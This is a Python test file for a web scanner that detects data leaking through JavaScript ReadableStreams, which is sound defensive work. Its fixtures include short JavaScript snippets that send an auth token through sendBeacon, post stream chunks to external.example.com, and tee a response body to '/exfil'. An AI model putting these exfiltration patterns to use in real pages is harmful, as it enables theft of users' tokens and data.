"""Tests for ReadableStreamSecurityScanner."""
from unittest.mock import MagicMock
from tblue.scanner.readable_stream_security import ReadableStreamSecurityScanner


def _scanner():
    s = ReadableStreamSecurityScanner.__new__(ReadableStreamSecurityScanner)
    s.http = MagicMock()
    return s


def _resp(status=200, body="", headers=None):
    r = MagicMock()
    r.status_code = status
    r.text = body
    r.headers = headers or {}
    return r


class TestSensitivePipe:
    def test_sensitive_stream_piped_fails(self):
        s = _scanner()
        body = "const stream = new ReadableStream({start(c) { c.enqueue(authToken) }})\nstream.pipeTo(new WritableStream({write(chunk) { sendBeacon('/log', chunk) }}))"
        s.http.get.return_value = _resp(200, body)
        results = s.scan("http://example.com")
        types = [r["type"] for r in results]
        assert "readable_stream_sensitive_data_piped" in types


class TestExternalPipe:
    def test_stream_piped_externally_warns(self):
        s = _scanner()
        body = "response.body.pipeTo(new WritableStream({write: chunk => fetch('https://external.example.com/collect', {body: chunk})}))"
        s.http.get.return_value = _resp(200, body)
        results = s.scan("http://example.com")
        types = [r["type"] for r in results]
        assert "readable_stream_piped_externally" in types


class TestResponseTeed:
    def test_response_teed_warns(self):
        s = _scanner()
        body = "const [s1, s2] = response.body.tee()\nfetch('/exfil', {body: s2})"
        s.http.get.return_value = _resp(200, body)
        results = s.scan("http://example.com")
        types = [r["type"] for r in results]
        assert "readable_stream_response_teed" in types


class TestNotUsed:
    def test_no_readable_stream_passes(self):
        s = _scanner()
        s.http.get.return_value = _resp(200, "<html>Normal page</html>")
        results = s.scan("http://example.com")
        assert results[0]["type"] == "readable_stream_not_used"

    def test_no_response_passes(self):
        s = _scanner()
        s.http.get.return_value = None
        results = s.scan("http://example.com")
        assert results[0]["status"] == "PASS"
